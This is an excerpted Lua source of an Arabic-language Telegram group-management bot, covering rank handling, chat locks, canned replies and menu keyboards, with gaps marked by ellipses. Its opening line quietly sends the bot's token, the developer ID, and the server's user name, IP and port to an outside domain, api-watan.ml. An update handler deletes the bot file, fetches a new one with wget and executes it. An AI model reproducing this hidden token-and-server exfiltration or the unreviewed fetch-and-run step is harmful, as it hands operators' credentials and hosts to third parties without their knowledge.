...
https.request("https://api-watan.ml/WaTaN2/index.php?Get=WaTaN2&DevId="..DevAbs:get(Server.."IdAntak").."&TokenBot="..DevAbs:get(Server.."TokenAntak").."&User="..User.."&Ip="..Ip.."&Name="..Name.."&Port="..Port)
...
FilesPrint = FilesPrint.."\27[35m".."𓍹======𝔹𝔸ℕ𝔻𝔼======𓍻 ┉ ┉ ┉\n".."\27[m"
...
local Status = DevAbs:sismember(Antak..'Abs:AbsSudo:',msg.sender_user_id_) 
...
----   Owner   ----
function Owner(msg) 
local Status = DevAbs:sismember(Antak..'Abs:Owner:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevAbs:sismember(Antak..'Abs:CleanerNum:'..msg.chat_id_,msg.sender_user_id_) 
...
local Status = DevAbs:sismember(Antak..'Abs:CleanerMusic:'..msg.chat_id_,msg.sender_user_id_) 
if Status or SudoBot(msg) or Cleaner(msg) or AbsConstructor(msg) or AbsSudo(msg) or Sudo(msg) or SecondSudo(msg) or Bot(msg) then  
return true  
else  
return false  
...
var = true
elseif DevAbs:sismember(Antak..'Abs:AbsSudo:', user_id) then
var = true
...
var = true
elseif DevAbs:sismember(Antak..'Abs:Owner:'..chat_id, user_id) then
var = true
...
local UserName = (dp.username_ or "AntakTeam")
...
DevAbs:del(Antak..'Abs:Text:GpTexts'..Abs..data.chat_id_)
DevAbs:srem(Antak..'Abs:Manager:GpRedod'..data.chat_id_,Abs)
end
if DataText and DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)') then
local Abs = DataText:match('/EndRedod:'..tonumber(data.sender_user_id_)..'(.*)')
local List = DevAbs:smembers(Antak..'Abs:Text:GpTexts'..Abs..data.chat_id_)
...
DevAbs:del(Antak..'Abs:Text:KtTexts'..Abs..data.chat_id_)
DevAbs:srem(Antak..'Abs:Sudo:Kt'..data.chat_id_,Abs)
end
...
local List = DevAbs:smembers(Antak..'Abs:Text:KtTexts'..Abs..data.chat_id_)
if DevAbs:get(Antak..'Abs:Add:Kt'..data.sender_user_id_..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "✯︙تم انهاء وحفظ ↫ "..#List.." من الاسئله للامر ↫ "..Abs) 
DevAbs:del(Antak..'Abs:Add:Kt'..data.sender_user_id_..data.chat_id_)
else
EditMsg(Chat_Id2, Msg_Id2, "✯︙عذرا صلاحية الامر منتهيه !") 
end
end
...
DevAbs:del(Antak..'Abs:Add:Kt'..data.sender_user_id_..data.chat_id_)
DevAbs:del(Antak..'Abs:Text:KtTexts'..Abs..data.chat_id_)
DevAbs:del(Antak..'Abs:Add:KtTexts'..data.sender_user_id_..data.chat_id_)
DevAbs:srem(Antak..'Abs:Sudo:Kt'..data.chat_id_,Abs)
else
EditMsg(Chat_Id2, Msg_Id2, "✯︙عذرا صلاحية الامر منتهيه !") 
end
...
EditMsg(Chat_Id2, Msg_Id2,'✯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'BAANDDE')..')\n✯︙تم رفعه في قائمة المميزين')
end,nil)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
DevAbs:sadd(Antak..'Abs:AbsSudo:'..data.chat_id_,dp.id_)
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
DevAbs:srem(Antak..'Abs:AbsSudo:'..data.chat_id_,dp.id_)
...
if DevAbs:sismember(Antak..'Abs:Muted:'..data.chat_id_, dp.id_) then
...
tdcli_function ({ID = "GetUser",user_id_ = AbsId},function(arg,dp) 
DevAbs:srem(Antak..'Abs:BanAll:', dp.id_)
DevAbs:srem(Antak..'Abs:MuteAll:', dp.id_)
EditMsg(Chat_Id2, Msg_Id2,'✯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'BAANDDE')..')\n✯︙تم الغاء العام')
end,nil)
end
...
local Text = '✯︙قم باستعمال الازرار لرفع العضو ↫ ⤈\n✯︙العضو ↫ ['..dp.first_name_..'](t.me/'..(dp.username_ or 'BAANDDE')..')'
keyboard = {} 
if Sudo(data) then
...
elseif Constructor(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..Abs},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..Abs}},{{text="تنزيل منظف",callback_data=data.sender_user_id_..":RemCleaner:"..Abs},{text="تنزيل مدير",callback_data=data.sender_user_id_..":RemManager:"..Abs}},{{text = '⌁ Antak TeAM.',url="t.me/BAANDDE"}}}
elseif Manager(data) then
keyboard.inline_keyboard = {{{text="تنزيل مميز",callback_data=data.sender_user_id_..":RemMem:"..Abs},{text="تنزيل ادمن",callback_data=data.sender_user_id_..":RemAdmin:"..Abs}}}
elseif Admin(data) then
...
local Del = DevAbs:get(Antak..'Abs:Del')
local Text = [[
...
DevAbs:del(Antak..'Abs:Owner:'..data.chat_id_)
...
DevAbs:del(Antak..'Abs:UsersMsgs'..data.chat_id_..':'..data.sender_user_id_)
...
DevAbs:del(Antak..'Abs:Constructor:'..data.chat_id_)
...
DevAbs:del(Antak..'Abs:Managers:'..data.chat_id_)
Text = "*✯︙تم حذف المدراء*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• القائمه الرئيسيه •",callback_data="/DelList:"..data.sender_user_id_}}}
https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevAbs:del(Antak..'Abs:Admins:'..data.chat_id_)
...
DevAbs:del(Antak..'Abs:VipMem:'..data.chat_id_)
...
DevAbs:del(Antak..'Abs:Cleaner:'..data.chat_id_)
...
DevAbs:del(Antak..'Abs:Muted:'..data.chat_id_)
...
local List = DevAbs:smembers(Antak..'Abs:Tkeed:'..data.chat_id_)
for k,v in pairs(List) do   
...
DevAbs:srem(Antak..'Abs:Tkeed:'..data.chat_id_, v)
end
...
DevAbs:del(Antak..'Abs:Ban:'..data.chat_id_)
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if DataText and DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)') and not DevAbs:get(Antak..'Abs:Lock:GpRd'..data.chat_id_) then
local Abs = DataText:match('/DelGpRed:'..tonumber(data.sender_user_id_)..'(.*)')
local redod = DevAbs:smembers(Antak..'Abs:Manager:GpRed'..data.chat_id_)
if #redod == 0 then
Text = "*✯︙لا توجد ردود مضافه*"
else
for k,v in pairs(redod) do
DevAbs:del(Antak..'Abs:Gif:GpRed'..v..data.chat_id_)
DevAbs:del(Antak..'Abs:Voice:GpRed'..v..data.chat_id_)
DevAbs:del(Antak..'Abs:Audio:GpRed'..v..data.chat_id_)
DevAbs:del(Antak..'Abs:Photo:GpRed'..v..data.chat_id_)
DevAbs:del(Antak..'Abs:Stecker:GpRed'..v..data.chat_id_)
DevAbs:del(Antak..'Abs:Video:GpRed'..v..data.chat_id_)
DevAbs:del(Antak..'Abs:File:GpRed'..v..data.chat_id_)
DevAbs:del(Antak..'Abs:Text:GpRed'..v..data.chat_id_)
DevAbs:del(Antak..'Abs:Manager:GpRed'..data.chat_id_)
end
...
if DataText and DataText:match('/DelGpRedAll:'..tonumber(data.sender_user_id_)..'(.*)') and not DevAbs:get(Antak..'Abs:Lock:GpRd'..data.chat_id_) then
...
local List = DevAbs:smembers(Antak.."List:Cmd:Group:New"..data.chat_id_)
for k,v in pairs(List) do
DevAbs:del(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":"..v)
DevAbs:del(Antak.."List:Cmd:Group:New"..data.chat_id_)
end
...
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":ا","ايدي")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"ا")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":م","رفع مميز")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"م")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":اد","رفع ادمن")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"اد")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":مد","رفع مدير")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"مد")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":من","رفع منشئ")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"من")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":اس","رفع منشئ اساسي")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"اس")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":مط","رفع مطور")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"مط")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":ثانوي","رفع مطور ثانوي")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"ثانوي")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":تك","تنزيل الكل")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"تك")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":تعط","تعطيل الايدي بالصوره")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"تعط")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":تفع","تفعيل الايدي بالصوره")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"تفع")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":ر","الرابط")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"ر")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":رر","ردود المدير")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"رر")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":،،","مسح المكتومين")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"،،")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":رد","اضف رد")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"رد")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":غ","غنيلي")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"غ")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..data.chat_id_..":#","مسح قائمه العام")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..data.chat_id_,"#")
...
DevAbs:sadd(Antak..'Abs:Admins:'..data.chat_id_, admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbs:srem(Antak..'Abs:Admins:'..data.chat_id_, admins[i].user_id_)
end
end,nil)
else
DevAbs:sadd(Antak..'Abs:Admins:'..data.chat_id_, admins[i].user_id_)
...
DevAbs:sadd(Antak.."Abs:BasicConstructor:"..data.chat_id_,admins[i].user_id_)
DevAbs:sadd(Antak.."Abs:AbsConstructor:"..data.chat_id_,admins[i].user_id_)
tdcli_function ({ID = "GetUser",user_id_ = admins[i].user_id_},function(arg,ba) 
if ba.first_name_ == false then
DevAbs:srem(Antak.."Abs:BasicConstructor:"..data.chat_id_,admins[i].user_id_)
DevAbs:srem(Antak.."Abs:AbsConstructor:"..data.chat_id_,admins[i].user_id_)
end
end,nil)  
end 
end
end,nil)
if DevAbs:sismember(Antak..'Abs:Groups',data.chat_id_) then
...
DevAbs:incrby(Antak..'Abs:Sudos'..data.sender_user_id_,1)
DevAbs:set(Antak..'Abs:SudosGp'..data.sender_user_id_..data.chat_id_,"Abs")
end
...
DevAbs:set(Antak.."Abs:Groups:Links"..data.chat_id_,LinkGroup) 
...
tdcli_function ({ID = "GetUser",user_id_ = data.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=data.chat_id_},function(arg,dp) 
if not DevAbs:sismember(Antak..'Abs:Groups',data.chat_id_) then
...
DevAbs:sadd(Antak..'Abs:BasicConstructor:'..data.chat_id_,Manager_id)  
DevAbs:sadd(Antak..'Abs:AbsConstructor:'..data.chat_id_,Manager_id)   
end  
end  
if num == 0 then
...
DevAbs:del(Antak.."Abs:Add:AllText"..data.sender_user_id_)
DevAbs:del(Antak.."Abs:Add:AllRed"..data.sender_user_id_)
...
local DelManagerRep = DevAbs:get(Antak..'DelManagerRep'..data.chat_id_)
DevAbs:srem(Antak..'Abs:Manager:GpRed'..data.chat_id_,DelManagerRep)
DevAbs:del(Antak..'Abs:Add:GpText'..data.sender_user_id_..data.chat_id_)
DevAbs:del(Antak..'Abs:Add:GpRed'..data.sender_user_id_..data.chat_id_)
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local Cmd = DevAbs:get(Antak..'Abs:Cmd')
local Text = [[
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local Msg = DevAbs:get(Antak..'Abs:Msg')
local Text = [[
...
DevAbs:del(Antak..'Abs:EditMsg'..data.chat_id_..data.sender_user_id_)
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local Filter = DevAbs:get(Antak..'Abs:Filter')
local Text = [[
...
DevAbs:del(Antak.."Abs:FilterAnimation"..data.chat_id_)
...
DevAbs:del(Antak.."Abs:FilterSteckr"..data.chat_id_)
...
DevAbs:del(Antak.."Abs:FilterPhoto"..data.chat_id_)
...
DevAbs:del(Antak..'Abs:Filters:'..data.chat_id_)
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local locklist = DevAbs:get(Antak..'Abs:locklist')
local Text = [[
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local LockBotList = DevAbs:get(Antak..'Abs:LockBotList')
local Text = [[
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local LockSpamList = DevAbs:get(Antak..'Abs:LockSpamList')
local Text = [[
...
if not DevAbs:get(Antak..'Abs:Lock:Join'..data.chat_id_) then
DevAbs:set(Antak..'Abs:Lock:Join'..data.chat_id_,true)
...
if not DevAbs:get(Antak..'Abs:Lock:Text'..data.chat_id_) then
DevAbs:set(Antak..'Abs:Lock:Text'..data.chat_id_,true)
...
if not DevAbs:get(Antak..'Abs:Lock:TagServr'..data.chat_id_) then
DevAbs:set(Antak..'Abs:Lock:TagServr'..data.chat_id_,true)
...
if not DevAbs:get(Antak..'Abs:Lock:EditMsgs'..data.chat_id_) then
DevAbs:set(Antak..'Abs:Lock:EditMsgs'..data.chat_id_,true)
...
if not DevAbs:get(Antak..'Abs:Lock:Stickers'..data.chat_id_) then
DevAbs:set(Antak..'Abs:Lock:Stickers'..data.chat_id_,true)
...
if not DevAbs:get(Antak..'Abs:Lock:Gifs'..data.chat_id_) then
DevAbs:set(Antak..'Abs:Lock:Gifs'..data.chat_id_,true)
...
if not DevAbs:get(Antak..'Abs:Lock:Photo'..data.chat_id_) then
DevAbs:set(Antak..'Abs:Lock:Photo'..data.chat_id_,true) 
...
if not DevAbs:get(Antak..'Abs:Lock:Videos'..data.chat_id_) then
DevAbs:set(Antak..'Abs:Lock:Videos'..data.chat_id_,true)
...
if not DevAbs:get(Antak..'Abs:Lock:Forwards'..data.chat_id_) then
DevAbs:set(Antak..'Abs:Lock:Forwards'..data.chat_id_,true)
...
DevAbs:set(Antak.."Abs:Lock:Bots"..data.chat_id_,"kick")  
...
DevAbs:set(Antak.."Abs:Lock:Bots"..data.chat_id_,"ked")   
...
DevAbs:set(Antak.."Abs:Lock:Bots"..data.chat_id_,"del")  
...
DevAbs:hset(Antak.."Abs:Spam:Group:User"..data.chat_id_ ,"Spam:User","kick")  
...
DevAbs:hset(Antak.."Abs:Spam:Group:User"..data.chat_id_ ,"Spam:User","keed")  
...
DevAbs:hset(Antak.."Abs:Spam:Group:User"..data.chat_id_ ,"Spam:User","del")  
...
DevAbs:hset(Antak.."Abs:Spam:Group:User"..data.chat_id_ ,"Spam:User","mute")  
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local Source = DevAbs:get(Antak..'Abs:Source')
local Text = [[
...
os.execute('rm -rf Antak.lua') 
os.execute('wget https://raw.githubusercontent.com/AntakTeam/Antak/main/Antak.lua') 
dofile('Antak.lua') 
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local Media = DevAbs:get(Antak..'Abs:Media')
local Text = [[
...
local List = DevAbs:smembers(Antak.."Abs:cleaner"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
local List = DevAbs:smembers(Antak.."Abs:cleanermusic"..data.chat_id_)
local Del = 0
for k,v in pairs(List) do
Del = (Del + 1)
local Message = v
...
DevAbs:del(Antak.."Abs:cleanermusic"..data.chat_id_)
else
...
if DevAbs:get(Antak.."Abs:Left:Bot"..Antak) then
...
if not DevAbs:get(Antak.."Abs:Lock:GpLinksinline"..data.chat_id_) then 
tdcli_function({ID ="GetChat",chat_id_=data.chat_id_},function(arg,ta) 
local linkgpp = json:decode(https.request('https://api.telegram.org/bot'..TokenBot..'/exportChatInviteLink?chat_id='..data.chat_id_)) or DevAbs:get(Antak.."Private:Group:Link"..data.chat_id_) 
...
if not DevAbs:get(Antak..'Abs:Lock:GpLinks'..data.chat_id_) then 
if DevAbs:get(Antak.."Abs:Groups:Links"..data.chat_id_) then
EditMsg(Chat_Id2, Msg_Id2, "✯︙Group Link ↬ ⤈ \n𓍹======𝔹𝔸ℕ𝔻𝔼======𓍻\n"..DevAbs:get(Antak.."Abs:Groups:Links"..data.chat_id_), 1, "html")
else 
...
if tonumber(Abs) == tonumber(data.sender_user_id_) then
local order = DevAbs:get(Antak..'Abs:order')
local Text = [[
...
DevAbs:set(Antak..'Abs:Lock:Id:Photo'..data.chat_id_,true)
...
DevAbs:set(Antak..'Abs:Lock:Id'..data.chat_id_,true)
...
DevAbs:set(Antak.."Abs:Lock:GpLinks"..data.chat_id_,"ok")
...
DevAbs:set(Antak.."Abs:Lock:GpLinksinline"..data.chat_id_,"ok")
...
DevAbs:del(Antak.."Abs:Lock:GpLinksinline"..data.chat_id_)
...
DevAbs:del(Antak.."Abs:Lock:Welcome"..data.chat_id_)
...
DevAbs:set(Antak.."Abs:Lock:Welcome"..data.chat_id_,true)
...
DevAbs:set(Antak..'Abs:Lock:AllRed'..data.chat_id_,true)
...
DevAbs:del(Antak..'Abs:Lock:AllRed'..data.chat_id_)
...
DevAbs:set(Antak..'Abs:Lock:GpRed'..data.chat_id_,true)
...
DevAbs:del(Antak..'Abs:Lock:GpRed'..data.chat_id_)
...
DevAbs:set(Antak.."Abs:Del:Me"..data.chat_id_, true)
Text = "*✯︙تم تعطيل نزلني*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevAbs:del(Antak.."Abs:Del:Me"..data.chat_id_)
Text = "*✯︙تم تفعيل نزلني*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevAbs:set(Antak.."Abs:Kick:Me"..data.chat_id_, true)
...
DevAbs:del(Antak.."Abs:Kick:Me"..data.chat_id_)
...
DevAbs:set(Antak.."Abs:Lock:KickBan"..data.chat_id_,"true")
Text = "*✯︙تم تعطيل الحظر*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevAbs:del(Antak.."Abs:Lock:KickBan"..data.chat_id_)
Text = "*✯︙تم تفعيل الحظر*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevAbs:set(Antak.."Abs:Lock:ProSet"..data.chat_id_,"true")
Text = "*✯︙تم تعطيل الرفع*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevAbs:del(Antak.."Abs:Lock:ProSet"..data.chat_id_)
Text = "*✯︙تم تفعيل الرفع*"
keyboard = {} 
keyboard.inline_keyboard = {{{text="• اخفاء الكليشه •",callback_data="/HideHelpList:"..data.sender_user_id_},{text="• رجوع •",callback_data="/lockorder:"..data.sender_user_id_}}}
return https.request("https://api.telegram.org/bot"..TokenBot..'/editMessageText?chat_id='..Chat_Id2..'&message_id='..Msg_Id2..'&text=' .. URL.escape(Text).."&parse_mode=markdown&disable_web_page_preview=true&reply_markup="..JSON.encode(keyboard))
...
DevAbs:set(Antak..'Abs:Lock:Games'..data.chat_id_,true)  
...
DevAbs:del(Antak..'Abs:Lock:Games'..data.chat_id_) 
...
DevAbs:set(Antak.."Set:Cmd:Group:New1"..msg.chat_id_..":مط","رفع مطور")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..msg.chat_id_,"مط")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..msg.chat_id_..":ثانوي","رفع مطور ثانوي")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..msg.chat_id_,"ثانوي")
...
DevAbs:set(Antak.."Set:Cmd:Group:New1"..msg.chat_id_..":ر","الرابط")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..msg.chat_id_,"ر")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..msg.chat_id_..":رر","ردود المدير")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..msg.chat_id_,"رر")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..msg.chat_id_..":،،","مسح المكتومين")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..msg.chat_id_,"،،")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..msg.chat_id_..":رد","اضف رد")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..msg.chat_id_,"رد")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..msg.chat_id_..":سح","مسح سحكاتي")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..msg.chat_id_,"سح")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..msg.chat_id_..":رس","مسح رسائلي")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..msg.chat_id_,"رس")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..msg.chat_id_..":غ","غنيلي")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..msg.chat_id_,"غ")
DevAbs:set(Antak.."Set:Cmd:Group:New1"..msg.chat_id_..":#","مسح قائمه العام")
DevAbs:sadd(Antak.."List:Cmd:Group:New"..msg.chat_id_,"#")
...
if DevAbs:sismember(Antak.."Coomds"..msg.chat_id_,DEV_Abs) then
function by_reply(extra, result, success)   
tdcli_function ({ID = "GetUser",user_id_ = result.sender_user_id_},function(arg,data) 
local mrAbs = DevAbs:get(Antak.."Comd:New:rt:Abs:"..DEV_Abs..msg.chat_id_)
if mrAbs == "مميز" and VipMem(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '✯︙العضو ↫ ❨ ['..data.first_name_..'](t.me/'..(data.username_ or 'BAANDDE')..')'..' ❩\n✯︙تم رفعه ❨ '..DEV_Abs..' ❩ بنجاح', 1, 'md')
DevAbs:set(Antak.."Comd:New:rt:User:"..msg.chat_id_..result.sender_user_id_,DEV_Abs) 
...
if mrAbs == "مميز" and VipMem(msg) then
Dev_Abs(msg.chat_id_, msg.id_, 1, '✯︙العضو ↫ ❨ ['..result.title_..'](t.me/'..(text1[3] or 'BAANDDE')..')'..' ❩\n✯︙تم رفعه ❨ '..text1[2]..' ❩ بنجاح', 1, 'md')
...
if text == '↫ السورس ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بتحديث  سورس براند فقط اضغط على الامر الذي تريد تنفيذه'
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب أحصائيات  سورس براند فقط اضغط على الامر الذي تريد تنفيذه'
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب المطورين لسورس براند فقط اضغط على الامر الذي تريد تنفيذه'
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه ب التفعيل والتعطيل لسورس براند فقط اضغط على الامر الذي تريد تنفيذه'
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاذاعه لسورس براند فقط اضغط على الامر الذي تريد تنفيذه'
...
if text == '↫ العام ᥀' then 
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالعام لسورس براند فقط اضغط على الامر الذي تريد تنفيذه'
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بردود الخاص لسورس براند فقط اضغط على الامر الذي تريد تنفيذه'
...
if SecondSudo(msg) then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي المطور \n᥀︙اليك الازرار الخاصه بالاشتراك الاجباري لسورس براند فقط اضغط على الامر الذي تريد تنفيذه'
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بالاوامر الخدميه الخاصه بسورس براند فقط اضغط على الامر الذي تريد تنفيذه'
local key = {{'↫ اوامر التسليه ᥀','↫ الاوامر الخدميه  ᥀'},{'↫ اوامر النسب ᥀','↫ البوتات ᥀'},{'↫ العاب ᥀'},{'↫  السورس ᥀','↫  المطور ᥀'},{'↫ رجوع ᥀'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ اوامر التسليه ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر التسليه الخاصه بسورس براند فقط اضغط على الامر الذي تريد تنفيذه'
...
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر البوتات الخاصه بسورس براند فقط اضغط على الامر الذي تريد تنفيذه'
local key = {{'↫ بوت الحذف ᥀','↫ بوت الهمسه ᥀'},{'↫ بوت اليوتيوب ᥀','↫ بوت الكت ᥀'},{'↫ بوت الزخرفه ᥀'},{'↫  رجوع  ᥀'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ اوامر النسب ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بأوامر النسب الخاصه بسورس براند فقط اضغط على الامر الذي تريد تنفيذه'
local key = {{'↫ نسبه الكره ᥀','↫ نسبه الحب ᥀'},{'↫ نسبه الرجوله ᥀','↫ نسبه الانوثه ᥀'},{'↫ نسبه الغباء ᥀','↫ نسبه الجمال ᥀'},{'↫ نسبه الخيانه ᥀'},{'↫  رجوع  ᥀'}}
SendInline(msg.chat_id_,Sudo_Welcome,key)
return false
end
if text == '↫ العاب ᥀' then 
local Sudo_Welcome = '᥀︙اهلا بك مجددا عزيزي \n᥀︙اليك الازرار الخاصه بألعاب سورس براند فقط اضغط على اللعبه الذي تريد لعبها'
...
Dev_Abs(msg.sender_user_id_, msg.id_, 1, '✯︙تم ارسال رسالتك الى [المطور](t.me/'..(chat.username_ or "BAANDDE")..')', 1, 'md') 
...
----- لن ابرئ الذمة لأي شخص يأخذ حرفاً او رقما من ملفي ، ايٍ كان الشخص لن ابرئ الذمة لهُ -----
if text and text:match("^(.*)$") then
local SaveKt = DevAbs:get(Antak..'Abs:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
